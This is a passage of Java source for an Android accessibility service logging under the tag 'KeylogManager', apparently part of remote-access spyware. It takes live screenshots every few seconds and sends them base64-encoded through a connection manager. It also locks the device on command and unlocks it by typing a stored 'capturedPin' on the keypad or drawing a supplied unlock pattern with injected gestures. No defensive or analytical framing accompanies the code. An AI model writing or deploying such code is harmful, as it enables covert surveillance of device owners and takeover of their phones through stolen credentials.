    private AccessibilityNodeInfo findNotificationParent(AccessibilityNodeInfo node) {
        try {
            AccessibilityNodeInfo current = node;
            int depth = 0;

            while (current != null && depth < 10) {
                String cls = current.getClassName() != null ? current.getClassName().toString() : "";

                if (cls.contains("Notification") ||
                        (current.isClickable() && current.getChildCount() > 0)) {
                    return current;
                }

                current = current.getParent();
                depth++;
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    // ⭐ Screenshot
    private boolean liveScreenshotEnabled = false;
    private android.os.Handler liveScreenshotHandler;
    private Runnable liveScreenshotRunnable;
    private int liveScreenshotInterval = 2000;
    private volatile boolean isTakingScreenshot = false;

    // ⭐ Screenshot Live
    public void startLiveScreenshot(int intervalMs) {
        Log.e("KeylogManager", "📸 Starting live screenshot...");

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.e("KeylogManager", "❌ takeScreenshot requires API 30+");
            return;
        }

        if (liveScreenshotEnabled) {
            Log.e("KeylogManager", "⚠️ Already running");
            return;
        }

        liveScreenshotEnabled = true;
        liveScreenshotInterval = Math.max(500, intervalMs);

        takeLiveScreenshot();

        liveScreenshotHandler = new android.os.Handler(android.os.Looper.getMainLooper());
        liveScreenshotRunnable = new Runnable() {
            @Override
            public void run() {
                if (!liveScreenshotEnabled)
                    return;
                takeLiveScreenshot();
                liveScreenshotHandler.postDelayed(this, liveScreenshotInterval);
            }
        };
        liveScreenshotHandler.postDelayed(liveScreenshotRunnable, liveScreenshotInterval);

        Log.e("KeylogManager", "✅ Live screenshot started (interval=" + intervalMs + "ms)");
    }

    // ⭐ Screenshot Live
    public void stopLiveScreenshot() {
        Log.e("KeylogManager", "📸 Stopping live screenshot...");
        liveScreenshotEnabled = false;

        if (liveScreenshotHandler != null) {
            liveScreenshotHandler.removeCallbacksAndMessages(null);
            liveScreenshotHandler = null;
        }
        liveScreenshotRunnable = null;

        Log.e("KeylogManager", "✅ Live screenshot stopped");
    }

    // ⭐take screenshot
    private void takeLiveScreenshot() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R)
            return;
        if (isTakingScreenshot) {
            Log.e("KeylogManager", "⚠️ Screenshot in progress, skipping");
            return;
        }

        isTakingScreenshot = true;

        try {
            takeScreenshot(
                    android.view.Display.DEFAULT_DISPLAY,
                    getMainExecutor(),
                    new TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(ScreenshotResult result) {
                            try {
                                android.graphics.Bitmap bitmap = android.graphics.Bitmap.wrapHardwareBuffer(
                                        result.getHardwareBuffer(),
                                        result.getColorSpace());

                                if (bitmap != null) {
                                    java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                                    bitmap.compress(
                                            android.graphics.Bitmap.CompressFormat.JPEG,
                                            60,
                                            baos);

                                    byte[] bytes = baos.toByteArray();
                                    String base64 = android.util.Base64.encodeToString(
                                            bytes,
                                            android.util.Base64.NO_WRAP);

                                    JSONObject jo = new JSONObject();
                                    jo.put("type", "live_screenshot");
                                    jo.put("image", base64);
                                    jo.put("width", bitmap.getWidth());
                                    jo.put("height", bitmap.getHeight());
                                    jo.put("time", System.currentTimeMillis());
                                    ConnectionManager.send(jo.toString());

                                    Log.e("KeylogManager", "📤 Sent live_screenshot: " +
                                            bitmap.getWidth() + "x" + bitmap.getHeight() +
                                            " (" + bytes.length + " bytes)");

                                    bitmap.recycle();
                                }

                                result.getHardwareBuffer().close();
                            } catch (Exception e) {
                                Log.e("KeylogManager", "❌ Process screenshot error: " +
                                        e.getMessage());
                            } finally {
                                isTakingScreenshot = false;
                            }
                        }

                        @Override
                        public void onFailure(int errorCode) {
                            Log.e("KeylogManager", "❌ Screenshot failed: " + errorCode);
                            isTakingScreenshot = false;
                        }
                    });
        } catch (Exception e) {
            Log.e("KeylogManager", "❌ takeScreenshot error: " + e.getMessage());
            isTakingScreenshot = false;
        }
    }

    // ═══════════════════════════════════════════════════════
    // ⭐ Lock Device
    // ═══════════════════════════════════════════════════════
    public void lockDevice() {
        try {
            Log.e(TAG, "🔒 Locking device...");

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                // ⭐ Android 9+ — GLOBAL_ACTION_LOCK_SCREEN
                boolean ok = performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
                Log.e(TAG, "✅ lockDevice: " + ok);
            } else {
                Log.e(TAG, "⚠️ Requires API 28+");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ lockDevice: " + e.getMessage());
        }
    }

    // ═══════════════════════════════════════════════════════
    // ⭐ Unlock Device
    // ═══════════════════════════════════════════════════════
    public void unlockDevice(String providedPin) {
        new Thread(() -> {
            try {
                Log.e(TAG, "🔓 unlockDevice STARTED");

                String pin = providedPin;

                if (pin == null || pin.isEmpty()) {
                    pin = capturedPin;
                    Log.e(TAG, "  Using stored pin: " + pin);
                }

                pin = pin.replace("[E]", "").replace("[OK]", "");

                if (pin.isEmpty()) {
                    Log.e(TAG, "❌ No pin available");
                    return;
                }

                Log.e(TAG, "  PIN to enter: " + pin);

                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null) {
                    android.os.PowerManager.WakeLock wl = pm.newWakeLock(
                            android.os.PowerManager.FULL_WAKE_LOCK |
                                    android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                            "Wexow::UnlockWake");
                    wl.acquire(5000);
                }

                android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
                int screenW = dm.widthPixels;
                int screenH = dm.heightPixels;

                Log.e(TAG, "  Swiping up...");
                swipe(screenW / 2, (int) (screenH * 0.8),
                        screenW / 2, (int) (screenH * 0.3), 300);
                Thread.sleep(1500);

                Log.e(TAG, "  Looking for PIN pad...");

                int maxAttempts = 10;
                for (int attempt = 0; attempt < maxAttempts; attempt++) {
                    attempt++;

                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root == null) {
                        Thread.sleep(500);
                        continue;
                    }

                    String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";

                    Log.e(TAG, "  Attempt #" + attempt + " pkg=" + pkg);

                    if (!pkg.contains("systemui") &&
                            !pkg.contains("keyguard") &&
                            !pkg.contains("miui.keyguard")) {
                        Log.e(TAG, "✅ Unlocked! Current pkg: " + pkg);
                        return;
                    }

                    if (attempt == 1) {
                        dumpAllTexts(root, 0);
                    }

                    boolean allEntered = true;
                    for (char c : pin.toCharArray()) {
                        String digit = String.valueOf(c);

                        AccessibilityNodeInfo digitNode = findNodeByTextManual(root, digit);

                        if (digitNode == null) {
                            Log.e(TAG, "  ❌ Digit " + digit + " not found");
                            allEntered = false;
                            break;
                        }

                        Rect b = new Rect();
                        digitNode.getBoundsInScreen(b);

                        Log.e(TAG, "  🎯 Clicking digit " + digit +
                                " at " + b.centerX() + "," + b.centerY());

                        click(b.centerX(), b.centerY());
                        Thread.sleep(300);

                        root = getRootInActiveWindow();
                        if (root == null)
                            break;
                    }

                    if (allEntered) {
                        Log.e(TAG, "  ✅ All digits entered");

                        Thread.sleep(500);
                        root = getRootInActiveWindow();
                        if (root != null) {
                            AccessibilityNodeInfo enterBtn = findNodeByTextManual(root, "Enter");
                            if (enterBtn == null) {
                                enterBtn = findNodeByTextManual(root, "OK");
                            }
                            if (enterBtn == null) {
                                enterBtn = findNodeByTextManual(root, "✓");
                            }
                            if (enterBtn == null) {
                                enterBtn = findNodeByTextManual(root, "موافق");
                            }

                            if (enterBtn != null) {
                                Rect b = new Rect();
                                enterBtn.getBoundsInScreen(b);
                                Log.e(TAG, "  🎯 Clicking Enter at " +
                                        b.centerX() + "," + b.centerY());
                                click(b.centerX(), b.centerY());
                            }
                        }

                        Thread.sleep(1500);

                        root = getRootInActiveWindow();
                        if (root != null) {
                            String finalPkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
                            if (!finalPkg.contains("keyguard") &&
                                    !finalPkg.contains("systemui")) {
                                Log.e(TAG, "✅✅ UNLOCKED SUCCESSFULLY!");
                            } else {
                                Log.e(TAG, "⚠️ Still on lock screen");
                            }
                        }
                        return;
                    }

                    Thread.sleep(1000);
                }

                Log.e(TAG, "❌ Failed to unlock after " + maxAttempts + " attempts");

            } catch (Exception e) {
                Log.e(TAG, "❌ unlockDevice: " + e.getMessage(), e);
            }
        }).start();
    }

    // ═══════════════════════════════════════════════════════
    // ⭐ Unlock Pattern
    // ═══════════════════════════════════════════════════════
    public void unlockWithPattern(String patternInput) {
        final String finalPattern = patternInput;

        new Thread(() -> {
            try {
                Log.e(TAG, "🔓 unlockWithPattern: " + finalPattern);

                if (finalPattern == null || finalPattern.isEmpty()) {
                    Log.e(TAG, "❌ Empty pattern");
                    return;
                }

                String cleanPattern = finalPattern.replace("PT_", "").trim();

                Log.e(TAG, "  Cleaned: " + cleanPattern);

                String[] points = cleanPattern.split("[\\s,]+");

                Log.e(TAG, "  Points: " + java.util.Arrays.toString(points));

                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null) {
                    android.os.PowerManager.WakeLock wl = pm.newWakeLock(
                            android.os.PowerManager.FULL_WAKE_LOCK |
                                    android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                            "Wexow::PatternWake");
                    wl.acquire(5000);
                }

                android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
                int screenW = dm.widthPixels;
                int screenH = dm.heightPixels;

                swipe(screenW / 2, (int) (screenH * 0.8),
                        screenW / 2, (int) (screenH * 0.3), 300);
                Thread.sleep(1500);

                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null)
                    return;

                Log.e(TAG, "  Looking for pattern points...");
                dumpAllTexts(root, 0);

                android.graphics.Path path = new android.graphics.Path();
                boolean started = false;

                for (String point : points) {
                    AccessibilityNodeInfo node = findNodeByTextManual(root, point);

                    if (node == null) {
                        List<AccessibilityNodeInfo> all = new java.util.ArrayList<>();
                        collectClickable(root, all);

                        for (AccessibilityNodeInfo n : all) {
                            CharSequence cd = n.getContentDescription();
                            if (cd != null && cd.toString().contains(point)) {
                                node = n;
                                break;
                            }
                        }
                    }

                    if (node != null) {
                        Rect b = new Rect();
                        node.getBoundsInScreen(b);

                        if (!started) {
                            path.moveTo(b.centerX(), b.centerY());
                            started = true;
                        } else {
                            path.lineTo(b.centerX(), b.centerY());
                        }

                        Log.e(TAG, "  Point " + point + " at " +
                                b.centerX() + "," + b.centerY());
                    }
                }

                if (!started) {
                    Log.e(TAG, "❌ No points found");
                    return;
                }

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    android.accessibilityservice.GestureDescription.StrokeDescription stroke = new android.accessibilityservice.GestureDescription.StrokeDescription(
                            path, 0, 500);

                    android.accessibilityservice.GestureDescription gesture = new android.accessibilityservice.GestureDescription.Builder()
                            .addStroke(stroke)
                            .build();

                    dispatchGesture(gesture, null, null);
                    Log.e(TAG, "✅ Pattern drawn");
                }

                Thread.sleep(2000);

                root = getRootInActiveWindow();
                if (root != null) {
                    String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
                    if (!pkg.contains("keyguard") && !pkg.contains("systemui")) {
                        Log.e(TAG, "✅✅ UNLOCKED SUCCESSFULLY!");
                    }
                }

            } catch (Exception e) {
                Log.e(TAG, "❌ unlockWithPattern: " + e.getMessage(), e);
            }
        }).start();
    }

    @Override
    public void onInterrupt() {
        instance = null;
    }

    @Override
    public boolean onUnbind(android.content.Intent intent) {
        instance = null;
        return super.onUnbind(intent);
    }
}
